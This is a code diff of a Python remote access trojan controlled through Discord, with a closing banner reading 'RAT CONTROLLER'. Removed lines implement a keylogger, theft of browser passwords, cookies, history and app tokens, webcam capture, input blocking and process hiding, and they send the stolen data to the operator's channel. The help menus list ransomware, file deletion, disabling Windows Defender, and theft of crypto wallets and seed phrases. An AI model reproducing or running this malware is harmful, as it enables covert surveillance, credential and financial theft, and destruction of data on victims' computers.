-            await send_embed(ctx, "Keylog", "Already running", discord.Color.orange())
-            return
-        thread = threading.Thread(target=start_keylog, daemon=True)
-        thread.start()
-        keylog_active = True
-        await send_embed(ctx, "Keylog", "Started", discord.Color.green())
-    elif action == 'stop':
-        keylog_active = False
-        await send_embed(ctx, "Keylog", "Stopped", discord.Color.orange())
-    elif action == 'dump':
-        if os.path.exists(keylog_file):
-            with open(keylog_file, 'r', encoding='utf-8') as f:
-                data = f.read()
-            if len(data) > 1900:
-                await ctx.send(file=discord.File(keylog_file))
-            else:
-                await send_embed(ctx, "Keylog Dump", f"```{data}```", discord.Color.blue())
-        else:
-            await send_embed(ctx, "Keylog", "No logs", discord.Color.red())
-    else:
-        await send_embed(ctx, "Usage", "!keylog start/stop/dump", discord.Color.orange())
-
-@bot.command(name='keylogstart')
-@is_authorized()
-async def keylog_start(ctx):
-    await keylog_cmd(ctx, 'start')
-
-@bot.command(name='keylogstop')
-@is_authorized()
-async def keylog_stop(ctx):
-    await keylog_cmd(ctx, 'stop')
-
-@bot.command(name='keylogdump')
-@is_authorized()
-async def keylog_dump(ctx):
-    if os.path.exists(keylog_file):
-        with open(keylog_file, 'r', encoding='utf-8') as f:
-            data = f.read()
-        if len(data) > 1900:
-            await ctx.send(file=discord.File(keylog_file))
-        else:
-            await send_embed(ctx, "⌨️ Keylog Dump", f"```{data}```", discord.Color.blue())
-    else:
-        await send_embed(ctx, "⌨️ Keylog", "No logs found", discord.Color.red())
-
-@bot.command(name='keylogclear')
-@is_authorized()
-async def keylog_clear(ctx):
-    if os.path.exists(keylog_file):
-        os.remove(keylog_file)
-        await send_embed(ctx, "⌨️ Keylog", "Logs cleared", discord.Color.green())
-    else:
-        await send_embed(ctx, "⌨️ Keylog", "No logs to clear", discord.Color.orange())
-
-@bot.command(name='keylogstatus')
-@is_authorized()
-async def keylog_status(ctx):
-    status = "🟢 Running" if keylog_active else "🔴 Stopped"
-    await send_embed(ctx, "⌨️ Keylogger Status", status, discord.Color.blue())
-
-# ========== ULTIMATE GRAB COMMAND ==========
-@bot.command(name='grab')
-@is_authorized()
-async def grab_all(ctx):
-    """ULTIMATE GRAB - Browser Cookies + App Tokens + App Cookies"""
-    await send_embed(ctx, "🔍 ULTIMATE GRAB INITIATED", 
-        "Scanning for:\n• ALL Browsers (Chrome, Edge, Brave, Firefox, Opera, Vivaldi, etc.)\n• Discord, Steam, Spotify, Battle.net\n• Riot Games, Epic, Minecraft\n• Roblox, Reddit, TikTok\n• Telegram, WhatsApp\n• And more...",
-        discord.Color.blue())
-    
-    results, detected = scan_all_apps()
-    
-    if detected:
-        detected_str = "✅ Detected: " + ", ".join(detected)
-    else:
-        detected_str = "❌ No token-bearing apps detected"
-    
-    if results:
-        output = "\n".join(results[:80])
-        if len(output) > 1900:
-            with open("grab_all.txt", "w", encoding='utf-8') as f:
-                f.write("\n".join(results))
-            await ctx.send(file=discord.File("grab_all.txt"))
-            os.remove("grab_all.txt")
-            embed = discord.Embed(title="📦 All Data Grabbed", color=discord.Color.green())
-            embed.add_field(name="📊 Detected Apps", value=detected_str, inline=False)
-            embed.add_field(name="📈 Total Items", value=str(len(results)), inline=True)
-            embed.add_field(name="💾 File", value="Downloaded above", inline=True)
-            await ctx.send(embed=embed)
-        else:
-            embed = discord.Embed(title="📦 All Data Grabbed", description=f"```{output}```", color=discord.Color.green())
-            embed.add_field(name="📊 Detected Apps", value=detected_str, inline=False)
-            embed.add_field(name="📈 Total Items", value=str(len(results)), inline=True)
-            await ctx.send(embed=embed)
-    else:
-        embed = discord.Embed(title="📦 No Data Found", color=discord.Color.red())
-        embed.add_field(name="💡 Tip", value="Make sure the target has apps like Discord, Steam, Chrome, etc. installed and logged in", inline=False)
-        await ctx.send(embed=embed)
-
-# ========== COOKIES COMMAND ==========
-@bot.command(name='cookies')
-@is_authorized()
-async def grab_cookies(ctx):
-    """Grab ALL browser cookies from ALL browsers"""
-    if not CRYPTO_AVAILABLE:
-        await send_embed(ctx, "❌ Error", "pycryptodome not installed - run: pip install pycryptodome", discord.Color.red())
-        return
-    
-    await send_embed(ctx, "🍪 Grabbing Cookies", "Extracting from all browsers...", discord.Color.blue())
-    cookies, detected = get_all_browser_cookies()
-    
-    if cookies:
-        output = "\n".join([f"**{c['browser']}** | `{c['host']}` → `{c['name']}` = `{c['value'][:40]}...`" for c in cookies[:50]])
-        if len(output) > 1900:
-            with open("cookies.txt", "w", encoding='utf-8') as f:
-                for c in cookies:
-                    f.write(f"{c['browser']} | {c['host']} | {c['name']} = {c['value']}\n")
-            await ctx.send(file=discord.File("cookies.txt"))
-            os.remove("cookies.txt")
-            await send_embed(ctx, "🍪 Cookies", f"Saved {len(cookies)} cookies to file", discord.Color.green())
-        else:
-            embed = discord.Embed(title="🍪 Browser Cookies", description=output[:1900], color=discord.Color.green())
-            embed.add_field(name="📊 Detected Browsers", value=", ".join(detected) if detected else "None", inline=False)
-            embed.add_field(name="📈 Total Cookies", value=str(len(cookies)), inline=True)
-            await ctx.send(embed=embed)
-    else:
-        await send_embed(ctx, "🍪 Cookies", "No cookies found in any browser", discord.Color.red())
-
-@bot.command(name='grabtokens')
-@is_authorized()
-async def grab_tokens(ctx):
-    await send_embed(ctx, "🔍 Scanning for Tokens", "Checking all installed apps...", discord.Color.blue())
-    tokens, detected = grab_all_tokens()
-    
-    if detected:
-        detected_str = "✅ Detected: " + ", ".join(detected)
-    else:
-        detected_str = "❌ No token-bearing apps detected"
-    
-    if tokens:
-        output = "\n".join(tokens[:50])
-        if len(output) > 1900:
-            with open("tokens.txt", "w", encoding='utf-8') as f:
-                f.write("\n".join(tokens))
-            await ctx.send(file=discord.File("tokens.txt"))
-            os.remove("tokens.txt")
-        else:
-            embed = discord.Embed(title="🔑 Tokens Found", description=f"```{output}```", color=discord.Color.green())
-            embed.add_field(name="📊 Detected Apps", value=detected_str, inline=False)
-            embed.add_field(name="📈 Total Tokens", value=str(len(tokens)), inline=True)
-            await ctx.send(embed=embed)
-    else:
-        embed = discord.Embed(title="🔑 No Tokens Found", color=discord.Color.red())
-        embed.add_field(name="📊 Detected Apps", value=detected_str, inline=False)
-        embed.add_field(name="💡 Tip", value="Make sure the target has apps like Discord, Steam, or Chrome installed and logged in", inline=False)
-        await ctx.send(embed=embed)
-
-@bot.command(name='password')
-@is_authorized()
-async def all_browser_passwords(ctx):
-    if not CRYPTO_AVAILABLE:
-        await send_embed(ctx, "Error", "pycryptodome not installed", discord.Color.red())
-        return
-    
-    await send_embed(ctx, "🔍 Dumping Passwords", "Checking all browsers...", discord.Color.blue())
-    passwords, detected = get_all_browser_passwords()
-    
-    if passwords:
-        output = "\n".join(passwords[:30])
-        if len(output) > 1900:
-            with open("passwords.txt", "w", encoding='utf-8') as f:
-                f.write("\n".join(passwords))
-            await ctx.send(file=discord.File("passwords.txt"))
-            os.remove("passwords.txt")
-        else:
-            embed = discord.Embed(title="🔑 Browser Passwords", description=f"```{output}```", color=discord.Color.green())
-            embed.add_field(name="📊 Detected Browsers", value=", ".join(detected) if detected else "None", inline=False)
-            embed.add_field(name="📈 Total Passwords", value=str(len(passwords)), inline=True)
-            await ctx.send(embed=embed)
-    else:
-        await send_embed(ctx, "Passwords", "No passwords found in any browser", discord.Color.red())
-
-@bot.command(name='webhistory')
-@is_authorized()
-async def browser_history(ctx):
-    await send_embed(ctx, "📜 Fetching Browser History", "Checking all browsers...", discord.Color.blue())
-    history, detected = get_all_browser_history()
-    
-    if history:
-        output = "\n".join(history[:50])
-        if len(output) > 1900:
-            with open("history.txt", "w", encoding='utf-8') as f:
-                f.write("\n".join(history))
-            await ctx.send(file=discord.File("history.txt"))
-            os.remove("history.txt")
-        else:
-            embed = discord.Embed(title="📜 Browser History", description=output[:1900], color=discord.Color.blue())
-            embed.add_field(name="📊 Detected Browsers", value=", ".join(detected) if detected else "None", inline=False)
-            await ctx.send(embed=embed)
-    else:
-        await send_embed(ctx, "History", "No browser history found", discord.Color.red())
-
-# ========== FOLDER COMMANDS ==========
-@bot.command(name='pictures')
-@is_authorized()
-async def pictures_cmd(ctx, *, path: str = ""):
-    if path:
-        target = os.path.join(get_folder_path('pictures'), path)
-        await list_files(ctx, target)
-    else:
-        await list_files(ctx, get_folder_path('pictures'))
-
-@bot.command(name='downloads')
-@is_authorized()
-async def downloads_cmd(ctx, *, path: str = ""):
-    if path:
-        target = os.path.join(get_folder_path('downloads'), path)
-        await list_files(ctx, target)
-    else:
-        await list_files(ctx, get_folder_path('downloads'))
-
-@bot.command(name='documents')
-@is_authorized()
-async def documents_cmd(ctx, *, path: str = ""):
-    if path:
-        target = os.path.join(get_folder_path('documents'), path)
-        await list_files(ctx, target)
-    else:
-        await list_files(ctx, get_folder_path('documents'))
-
-@bot.command(name='music')
-@is_authorized()
-async def music_cmd(ctx, *, path: str = ""):
-    if path:
-        target = os.path.join(get_folder_path('music'), path)
-        await list_files(ctx, target)
-    else:
-        await list_files(ctx, get_folder_path('music'))
-
-@bot.command(name='videos')
-@is_authorized()
-async def videos_cmd(ctx, *, path: str = ""):
-    if path:
-        target = os.path.join(get_folder_path('videos'), path)
-        await list_files(ctx, target)
-    else:
-        await list_files(ctx, get_folder_path('videos'))
-
-@bot.command(name='desktop')
-@is_authorized()
-async def desktop_cmd(ctx, *, path: str = ""):
-    if path:
-        target = os.path.join(get_folder_path('desktop'), path)
-        await list_files(ctx, target)
-    else:
-        await list_files(ctx, get_folder_path('desktop'))
-
-@bot.command(name='programfiles')
-@is_authorized()
-async def program_files_cmd(ctx, *, path: str = ""):
-    base = "C:\\Program Files"
-    if path:
-        target = os.path.join(base, path)
-        await list_files(ctx, target)
-    else:
-        await list_files(ctx, base)
-
-@bot.command(name='programfilesx86')
-@is_authorized()
-async def program_files_x86_cmd(ctx, *, path: str = ""):
-    base = "C:\\Program Files (x86)"
-    if path:
-        target = os.path.join(base, path)
-        await list_files(ctx, target)
-    else:
-        await list_files(ctx, base)
-
-@bot.command(name='windows')
-@is_authorized()
-async def windows_cmd(ctx, *, path: str = ""):
-    base = "C:\\Windows"
-    if path:
-        target = os.path.join(base, path)
-        await list_files(ctx, target)
-    else:
-        await list_files(ctx, base)
-
-@bot.command(name='system32')
-@is_authorized()
-async def system32_cmd(ctx, *, path: str = ""):
-    base = "C:\\Windows\\System32"
-    if path:
-        target = os.path.join(base, path)
-        await list_files(ctx, target)
-    else:
-        await list_files(ctx, base)
-
-@bot.command(name='users')
-@is_authorized()
-async def users_cmd(ctx, *, path: str = ""):
-    base = "C:\\Users"
-    if path:
-        target = os.path.join(base, path)
-        await list_files(ctx, target)
-    else:
-        await list_files(ctx, base)
-
-@bot.command(name='appdata')
-@is_authorized()
-async def appdata_cmd(ctx, *, path: str = ""):
-    base = os.path.expanduser("~") + "\\AppData"
-    if path:
-        target = os.path.join(base, path)
-        await list_files(ctx, target)
-    else:
-        await list_files(ctx, base)
-
-@bot.command(name='local')
-@is_authorized()
-async def local_cmd(ctx, *, path: str = ""):
-    base = os.path.expanduser("~") + "\\AppData\\Local"
-    if path:
-        target = os.path.join(base, path)
-        await list_files(ctx, target)
-    else:
-        await list_files(ctx, base)
-
-@bot.command(name='roaming')
-@is_authorized()
-async def roaming_cmd(ctx, *, path: str = ""):
-    base = os.path.expanduser("~") + "\\AppData\\Roaming"
-    if path:
-        target = os.path.join(base, path)
-        await list_files(ctx, target)
-    else:
-        await list_files(ctx, base)
-
-@bot.command(name='temp')
-@is_authorized()
-async def temp_cmd(ctx, *, path: str = ""):
-    base = os.environ['TEMP']
-    if path:
-        target = os.path.join(base, path)
-        await list_files(ctx, target)
-    else:
-        await list_files(ctx, base)
-
-@bot.command(name='goto')
-@is_authorized()
-async def goto_folder(ctx, *, path: str):
-    if os.path.exists(path) and os.path.isdir(path):
-        await list_files(ctx, path)
-    else:
-        await send_embed(ctx, "Error", f"Folder not found: {path}", discord.Color.red())
-
-@bot.command(name='sysinfo')
-@is_authorized()
-async def sysinfo_cmd(ctx):
-    await system_info(ctx)
-
-@bot.command(name='processes')
-@is_authorized()
-async def processes_cmd(ctx):
-    await list_process(ctx)
-
-@bot.command(name='apps')
-@is_authorized()
-async def apps_cmd(ctx, limit: int = 15):
-    await list_applications(ctx, limit)
-
-@bot.command(name='clip')
-@is_authorized()
-async def clip_cmd(ctx):
-    await get_clipboard(ctx)
-
-@bot.command(name='cam')
-@is_authorized()
-async def cam_cmd(ctx, duration: int = 10):
-    await cam_record(ctx, duration)
-
-@bot.command(name='idletime')
-@is_authorized()
-async def idle_time(ctx):
-    idle = get_idle_time()
-    await send_embed(ctx, "Idle Time", idle, discord.Color.blue())
-
-@bot.command(name='webcampic')
-@is_authorized()
-async def webcam_pic(ctx):
-    await send_embed(ctx, "Capturing", "Webcam...", discord.Color.blue())
-    path = capture_webcam()
-    if path and os.path.exists(path):
-        with open(path, 'rb') as f:
-            await ctx.send(file=discord.File(f))
-        os.remove(path)
-    else:
-        await send_embed(ctx, "Webcam", "Failed or no camera", discord.Color.red())
-
-@bot.command(name='wallpaper')
-@is_authorized()
-async def change_wallpaper(ctx):
-    if not ctx.message.attachments:
-        await send_embed(ctx, "Wallpaper", "Attach an image", discord.Color.orange())
-        return
-    path = os.environ['TEMP'] + "\\wallpaper.jpg"
-    await ctx.message.attachments[0].save(path)
-    set_wallpaper(path)
-    await send_embed(ctx, "Wallpaper", "Changed", discord.Color.green())
-
-@bot.command(name='blockinput')
-@is_authorized()
-async def block_input_cmd(ctx):
-    if not is_admin():
-        await send_embed(ctx, "Error", "Admin required", discord.Color.red())
-        return
-    block_input(True)
-    await send_embed(ctx, "Input", "Blocked (keyboard/mouse)", discord.Color.red())
-
-@bot.command(name='unblockinput')
-@is_authorized()
-async def unblock_input_cmd(ctx):
-    block_input(False)
-    await send_embed(ctx, "Input", "Unblocked", discord.Color.green())
-
-@bot.command(name='critical')
-@is_authorized()
-async def critical_proc(ctx):
-    if not is_admin():
-        await send_embed(ctx, "Error", "Admin required", discord.Color.red())
-        return
-    if make_critical():
-        await send_embed(ctx, "Critical", "Process is now critical - closing will BSOD", discord.Color.red())
-    else:
-        await send_embed(ctx, "Critical", "Failed", discord.Color.red())
-
-@bot.command(name='rootkit')
-@is_authorized()
-async def rootkit_cmd(ctx):
-    if hide_process():
-        await send_embed(ctx, "Rootkit", "Process hidden (svchost.exe)", discord.Color.green())
-    else:
-        await send_embed(ctx, "Rootkit", "Admin required", discord.Color.red())
-
-@bot.command(name='cd')
-@is_authorized()
-async def change_dir(ctx, path: str = None):
-    global current_path
-    if not path:
-        await send_embed(ctx, "Current Dir", current_path, discord.Color.blue())
-        return
-    if path == "..":
-        current_path = os.path.dirname(current_path)
-        await send_embed(ctx, "Changed", current_path, discord.Color.green())
-        return
-    new_path = path if os.path.isabs(path) else os.path.join(current_path, path)
-    if os.path.exists(new_path) and os.path.isdir(new_path):
-        current_path = new_path
-        await send_embed(ctx, "Changed", current_path, discord.Color.green())
-    else:
-        await send_embed(ctx, "Error", "Invalid path", discord.Color.red())
-
-@bot.command(name='upload')
-@is_authorized()
-async def upload_file(ctx):
-    if not ctx.message.attachments:
-        await send_embed(ctx, "Upload", "Attach a file", discord.Color.orange())
-        return
-    path = os.path.join(current_path, ctx.message.attachments[0].filename)
-    await ctx.message.attachments[0].save(path)
-    await send_embed(ctx, "Uploaded", path, discord.Color.green())
-
-@bot.command(name='download')
-@is_authorized()
-async def download_file(ctx, *, filepath: str):
-    try:
-        if not os.path.isabs(filepath) and not filepath.startswith('.'):
-            filepath = os.path.join(current_path, filepath)
-        elif filepath.startswith('.'):
-            filepath = os.path.join(current_path, filepath[2:])
-        filepath = os.path.normpath(filepath)
-        if os.path.exists(filepath) and os.path.isfile(filepath):
-            if os.path.getsize(filepath) > 104857600:
-                await send_embed(ctx, "Error", "File >100MB (Discord limit)", discord.Color.red())
-                return
-            await ctx.send(file=discord.File(filepath))
-        else:
-            dirname = os.path.dirname(filepath)
-            basename = os.path.basename(filepath)
-            if os.path.exists(dirname):
-                similar = [f for f in os.listdir(dirname) if basename.lower() in f.lower()]
-                if similar:
-                    await send_embed(ctx, "File Not Found", 
-                        f"Did you mean one of these?\n```\n" + "\n".join(similar[:5]) + "\n```\n\nUse: `!download filename`",
-                        discord.Color.orange())
-                    return
-            await send_embed(ctx, "Error", f"File not found: {filepath}", discord.Color.red())
-    except Exception as e:
-        await send_embed(ctx, "Error", str(e), discord.Color.red())
-
-@bot.command(name='exit')
-@is_authorized()
-async def exit_bot(ctx):
-    await send_embed(ctx, "Exiting", "Goodbye", discord.Color.dark_grey())
-    sys.exit(0)
-
-@bot.command(name='installed')
-@is_authorized()
-async def installed_programs(ctx):
-    await send_embed(ctx, "📦 Getting installed programs...", "This may take a moment", discord.Color.blue())
-    programs = get_installed_programs()
-    output = "\n".join(programs[:100])
-    if len(output) > 1900:
-        output = output[:1900] + "..."
-    await send_embed(ctx, "📦 Installed Programs", f"```{output}```", discord.Color.green())
-
-@bot.command(name='shake')
-@is_authorized()
-async def shake_cursor(ctx, duration: int = 10):
-    global shake_active
-    if duration < 5:
-        duration = 5
-    if duration > 300:
-        duration = 300
-    if shake_active:
-        await send_embed(ctx, "❌ Error", "Shake already running", discord.Color.red())
-        return
-    if start_shake(duration):
-        await send_embed(ctx, "🔄 Cursor Shake", f"Started for {duration} seconds", discord.Color.blue())
-    else:
-        await send_embed(ctx, "❌ Error", "Could not start shake", discord.Color.red())
-
-@bot.command(name='shakestop')
-@is_authorized()
-async def shake_stop(ctx):
-    global shake_active
-    if stop_shake():
-        await send_embed(ctx, "⏹️ Shake Stopped", "Cursor shake has been stopped", discord.Color.green())
-    else:
-        await send_embed(ctx, "❌ Error", "No shake running", discord.Color.red())
-
-@bot.command(name='mute')
-@is_authorized()
-async def mute_audio(ctx):
-    try:
-        subprocess.run('powershell -Command "(New-Object -ComObject Wscript.Shell).SendKeys([char]174)"', shell=True, capture_output=True)
-        await send_embed(ctx, "🔇 Muted", "System audio has been muted", discord.Color.red())
-    except:
-        await send_embed(ctx, "❌ Error", "Could not mute audio", discord.Color.red())
-
-@bot.command(name='unmute')
-@is_authorized()
-async def unmute_audio(ctx):
-    try:
-        subprocess.run('powershell -Command "(New-Object -ComObject Wscript.Shell).SendKeys([char]174)"', shell=True, capture_output=True)
-        await send_embed(ctx, "🔊 Unmuted", "System audio has been unmuted", discord.Color.green())
-    except:
-        await send_embed(ctx, "❌ Error", "Could not unmute audio", discord.Color.red())
-
-@bot.command(name='capslock')
-@is_authorized()
-async def caps_lock_toggle(ctx):
-    try:
-        pyautogui.press('capslock')
-        await send_embed(ctx, "🔠 Caps Lock", "Toggled caps lock", discord.Color.blue())
-    except:
-        await send_embed(ctx, "❌ Error", "Could not toggle caps lock", discord.Color.red())
-
-@bot.command(name='capslockon')
-@is_authorized()
-async def caps_lock_on(ctx):
-    try:
-        if ctypes.windll.user32.GetKeyState(0x14) & 0x0001:
-            await send_embed(ctx, "🔠 Caps Lock", "Already ON", discord.Color.orange())
-            return
-        pyautogui.press('capslock')
-        await send_embed(ctx, "🔠 Caps Lock", "Turned ON", discord.Color.blue())
-    except:
-        await send_embed(ctx, "❌ Error", "Could not turn caps lock on", discord.Color.red())
-
-@bot.command(name='capslockoff')
-@is_authorized()
-async def caps_lock_off(ctx):
-    try:
-        if not (ctypes.windll.user32.GetKeyState(0x14) & 0x0001):
-            await send_embed(ctx, "🔠 Caps Lock", "Already OFF", discord.Color.orange())
-            return
-        pyautogui.press('capslock')
-        await send_embed(ctx, "🔠 Caps Lock", "Turned OFF", discord.Color.blue())
-    except:
-        await send_embed(ctx, "❌ Error", "Could not turn caps lock off", discord.Color.red())
-
-@bot.command(name='fullscreenlock')
-@is_authorized()
-async def fullscreen_lock(ctx):
-    try:
-        hwnd = ctypes.windll.user32.FindWindowW("Shell_TrayWnd", None)
-        ctypes.windll.user32.ShowWindow(hwnd, 0)
-        await send_embed(ctx, "🖥️ Fullscreen Lock", "Taskbar hidden. Use !fullscreenunlock to restore", discord.Color.blue())
-    except Exception as e:
-        await send_embed(ctx, "❌ Error", str(e), discord.Color.red())
-
-@bot.command(name='fullscreenunlock')
-@is_authorized()
-async def fullscreen_unlock(ctx):
-    try:
-        hwnd = ctypes.windll.user32.FindWindowW("Shell_TrayWnd", None)
-        ctypes.windll.user32.ShowWindow(hwnd, 1)
-        await send_embed(ctx, "🖥️ Fullscreen Unlocked", "Taskbar restored", discord.Color.green())
-    except Exception as e:
-        await send_embed(ctx, "❌ Error", str(e), discord.Color.red())
+def get_file_emoji(filename):
+    ext = os.path.splitext(filename)[1].lower()
+    emoji_map = {
+        '.txt': '📄', '.py': '🐍', '.pyw': '🐍', '.exe': '⚙️', '.dll': '🔧',
+        '.jpg': '🖼️', '.jpeg': '🖼️', '.png': '🖼️', '.gif': '🖼️', '.bmp': '🖼️',
+        '.mp3': '🎵', '.wav': '🎵', '.mp4': '🎬', '.avi': '🎬', '.mkv': '🎬',
+        '.zip': '📦', '.rar': '📦', '.pdf': '📕', '.doc': '📘', '.docx': '📘',
+        '.xls': '📊', '.xlsx': '📊', '.json': '📋', '.xml': '📋', '.html': '🌐',
+        '.css': '🎨', '.js': '⚡', '.iso': '💿', '.msi': '📦', '.bat': '💻',
+        '.cmd': '💻', '.ps1': '💻', '.reg': '📝', '.ini': '📝', '.cfg': '📝',
+        '.conf': '📝', '.log': '📋', '.ttf': '🔤', '.otf': '🔤', '.apk': '📱',
+        '.torrent': '🧲', '.lua': '📜'
+    }
+    return emoji_map.get(ext, '📄')
+
+# ============================================================
+# HELP COMMAND
+# ============================================================
 
 @bot.command(name='help')
+@is_authorized()
 async def help_cmd(ctx):
     embed = discord.Embed(
-        title="Commands",
-        description="A list of commands you can run to control the target PC.",
+        title="📋 Commands",
+        description=f"Prefix: `{Config.PREFIX}` | Delivery: `{Config.DELIVERY_METHOD}`",
         color=discord.Color.purple()
     )
     
-    categories = {
-        "🔧 Config": [
-            f"**Prefix:** `{Config.PREFIX}`",
-            f"**Whitelisted:** <@{Config.WHITELISTED[0]}>",
-            f"**Main Channel:** <#{Config.MAIN_CHANNEL}>"
-        ],
-        "ℹ️ System Info": [
-            "`info` - Get advanced system information (HWID, CPU, GPU, RAM, IP, WiFi passwords)",
-            "`sysinfo` - Alias for info",
-            "`idletime` - Check how long the user has been idle",
-            "`geolocate` - Get IP geolocation"
-        ],
-        "💀 Destructive": [
-            "`lock` - Locks the PC (requires admin)",
-            "`crash` - Blue screens the PC (requires admin)",
-            "`filescramble` - Renames all personal files randomly",
-            "`filedestroy` - Deletes all personal files (⚠️ DANGEROUS)",
-            "`fileransom` - Encrypts all personal files (⚠️ DANGEROUS)",
-            "`virus` - Displays fake virus popups",
-            "`delete <file>` - Delete a specific file"
-        ],
-        "💬 Messages & Alerts": [
-            "`voice <message>` - Text-to-speech message",
-            "`msgbox <message>` - Message box popup",
-            "`rickroll` - Opens Rickroll video"
-        ],
-        "🎮 Control & Commands": [
-            "`screenshot [name]` - Take screenshot",
-            "`open <app>` - Open application",
-            "`close <app>` - Close application",
-            "`listapps [limit]` - List running applications",
-            "`apps` - Alias for listapps",
-            "`cmd <command>` - Run a CMD command",
-            "`website <url>` - Open a website"
-        ],
-        "🖱️ Mouse & Keyboard": [
-            "`click [left|right|middle]` - Mouse click",
-            "`press <keys>` - Press keys",
-            "`blockinput` - Block keyboard/mouse (admin)",
-            "`unblockinput` - Unblock keyboard/mouse",
-            "`shake <seconds>` - Shake cursor (5-300s)",
-            "`shakestop` - Stop cursor shaking"
-        ],
-        "⚡ Power Control": [
-            "`shutdown [delay]` - Shutdown PC",
-            "`restart [delay]` - Restart PC",
-            "`critical` - Make process critical (admin)",
-            "`rootkit` - Hide process (admin)"
-        ],
-        "🎵 Media & Audio": [
-            "`playpause` - Play/Pause media",
-            "`nexttrack` - Next track",
-            "`mute` - Mute system audio",
-            "`unmute` - Unmute system audio",
-            "`capslock` - Toggle caps lock",
-            "`capslockon` - Turn caps lock ON",
-            "`capslockoff` - Turn caps lock OFF"
-        ],
-        "🖥️ Display": [
-            "`fullscreenlock` - Hide taskbar",
-            "`fullscreenunlock` - Show taskbar",
-            "`wallpaper` - Change wallpaper"
-        ],
-        "📂 Files & Navigation": [
-            "`cd <path>` - Change directory",
-            "`dir` - List current directory",
-            "`listfiles <directory>` - List files with details",
-            "`download <file>` - Download a file",
-            "`upload` - Upload a file",
-            "`downloads` - List Downloads folder",
-            "`documents` - List Documents folder",
-            "`pictures` - List Pictures folder",
-            "`music` - List Music folder",
-            "`videos` - List Videos folder",
-            "`desktop` - List Desktop folder",
-            "`installed` - List installed programs",
-            "`search <query>` - Search for files",
-            "`recent` - Show recently modified files",
-            "`images` - Show only image files (jpg, png, gif, webp, bmp)",
-            "`vids` - Show only video files (mp4, avi, mkv, mov)",
-            "`audio` - Show only audio files (mp3, wav, flac)",
-            "`programfiles` - C:\\Program Files",
-            "`programfilesx86` - C:\\Program Files (x86)",
-            "`windows` - C:\\Windows",
-            "`system32` - C:\\Windows\\System32",
-            "`users` - C:\\Users",
-            "`appdata` - AppData folder",
-            "`local` - AppData\\Local",
-            "`roaming` - AppData\\Roaming",
-            "`temp` - Temp folder",
-            "`goto <path>` - Go to any folder"
-        ],
-        "🎥 Surveillance": [
-            "`webcampic` - Take webcam photo",
-            "`camrec <seconds>` - Record webcam video (5-300s)",
-            "`cam` - Alias for camrec",
-            "`mic <seconds>` - Record microphone",
-            "`screenshot` - Take screenshot",
-            "`clipboard` - Get clipboard contents",
-            "`clip` - Alias for clipboard",
-            "`keylog start/stop/dump` - Keylogger control",
-            "`keylogstart` - Start keylogger",
-            "`keylogstop` - Stop keylogger",
-            "`keylogdump` - Dump keylogger logs",
-            "`keylogclear` - Clear keylogger logs",
-            "`keylogstatus` - Check keylogger status"
-        ],
-        "🔐 Security & Stealing": [
-            "`grabtokens` - Grab tokens from Discord, Steam, Chrome, Epic, Minecraft, Spotify, Riot, Reddit, TikTok, Battle.net, Telegram, WhatsApp, Roblox",
-            "`password` - Dump passwords from ALL browsers",
-            "`webhistory` - Get browser history from ALL browsers",
-            "`cookies` - Grab ALL cookies from ALL browsers",
-            "`grab` - ULTIMATE GRAB: ALL browsers + ALL apps in ONE command",
-            "`disabledefender` - Disable Windows Defender (admin)",
-            "`disablefirewall` - Disable Windows Firewall (admin)",
-            "`disabletaskmgr` - Disable Task Manager",
-            "`enabletaskmgr` - Enable Task Manager"
-        ],
-        "⚙️ Process Management": [
-            "`listprocess` - List all running processes",
-            "`processes` - Alias for listprocess",
-            "`prockill <name>` - Kill a process"
-        ],
-        "🔁 Persistence": [
-            "`persistence` - Add to startup",
-            "`startup add/remove` - Add/remove from startup",
-            "`killswitch` - Clean traces and exit"
-        ],
-        "🤖 Bot": [
-            "`exit` - EXITS"
-        ]
-    }
+    commands_list = [
+        ("`grab`", "ULTIMATE GRAB - Everything (tokens, cookies, seed phrases, wallets)"),
+        ("`info`", "System Information (HWID, CPU, GPU, RAM, IP, WiFi)"),
+        ("`screenshot`", "Take screenshot"),
+        ("`webcampic`", "Take webcam photo"),
+        ("`keylogstart`", "Start keylogger"),
+        ("`keylogstop`", "Stop keylogger"),
+        ("`keylogdump`", "Dump keylogger logs"),
+        ("`cmd <command>`", "Run CMD command"),
+        ("`download <file>`", "Download a file"),
+        ("`listfiles <dir>`", "List directory contents"),
+        ("`lock`", "Lock PC"),
+        ("`shutdown <delay>`", "Shutdown PC"),
+        ("`restart <delay>`", "Restart PC"),
+        ("`persistence`", "Add to startup"),
+        ("`killswitch`", "Clean traces and exit")
+    ]
     
-    for category, commands in categories.items():
-        embed.add_field(
-            name=category,
-            value="\n".join(commands),
-            inline=False
-        )
+    for cmd, desc in commands_list:
+        embed.add_field(name=cmd, value=desc, inline=False)
     
     await ctx.send(embed=embed)
 
-@bot.command(name='startup')
-@is_authorized()
-async def startup_cmd(ctx, action: str = None):
-    if action == 'add':
-        add_to_startup()
-        await send_embed(ctx, "Startup", "Added", discord.Color.green())
-    elif action == 'remove':
-        try:
-            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_SET_VALUE)
-            winreg.DeleteValue(key, "WindowsUpdate")
-            winreg.CloseKey(key)
-            await send_embed(ctx, "Startup", "Removed", discord.Color.green())
-        except:
-            await send_embed(ctx, "Startup", "Not found", discord.Color.orange())
-    else:
-        await send_embed(ctx, "Usage", "!startup add/remove", discord.Color.orange())
-
-@bot.command(name='dir')
-@is_authorized()
-async def dir_cmd(ctx):
-    await list_files(ctx, current_path)
-
-@bot.command(name='delete')
-@is_authorized()
-async def delete_file(ctx, *, filepath: str):
-    try:
-        if not os.path.isabs(filepath):
-            filepath = os.path.join(current_path, filepath)
-        filepath = os.path.normpath(filepath)
-        if os.path.exists(filepath):
-            os.remove(filepath)
-            await send_embed(ctx, "Deleted", filepath, discord.Color.red())
-        else:
-            await send_embed(ctx, "Error", f"File not found: {filepath}", discord.Color.red())
-    except Exception as e:
-        await send_embed(ctx, "Error", str(e), discord.Color.red())
-
-@bot.event
-async def on_command_error(ctx, error):
-    if isinstance(error, commands.CommandNotFound):
-        await send_embed(ctx, "Unknown Command", f"Use `{Config.PREFIX}help`", discord.Color.red())
+# ============================================================
+# BOT RUN
+# ============================================================
 
 if __name__ == "__main__":
+    # Show startup banner
+    clear_screen()
+    print(f"""
+{Colors.YELLOW}╔═══════════════════════════════════════════════════════════════╗
+{Colors.YELLOW}║{Colors.WHITE}              RAT CONTROLLER                          {Colors.YELLOW}║
+{Colors.YELLOW}║{Colors.WHITE}         Discord / Telegram Remote Access             {Colors.YELLOW}║
